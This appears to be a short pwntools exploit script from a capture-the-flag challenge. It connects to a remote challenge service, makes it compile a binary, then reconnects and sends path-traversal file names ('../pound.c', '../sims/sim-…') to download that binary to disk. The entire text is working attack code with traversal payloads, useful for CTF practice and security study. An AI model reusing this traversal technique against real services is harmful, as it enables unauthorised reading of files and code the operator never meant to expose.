from pwn import *

context.log_level="DEBUG"

# Compile it.
r=remote("pound.pwning.xxx", 9765)
r.sendline("2")
r.sendline("N^9")
r.sendline("N*N")
r.sendline("x")
r.sendline("y")
r.sendline("6")
r.recvall()
r.close()

# Get it.
r=remote("pound.pwning.xxx", 9765)
r.sendline("1")
#r.sendline("../pound.c")
r.sendline("../sims/sim-f11a3c0546c822e8d389243172b8f13698fdf8641f219b7cc7a365a977b7c5b6")
r.sendline("3")
r.recvuntil("(1 - 20)\n")
s=r.recvall()
open("their_binary","wb").write(s)
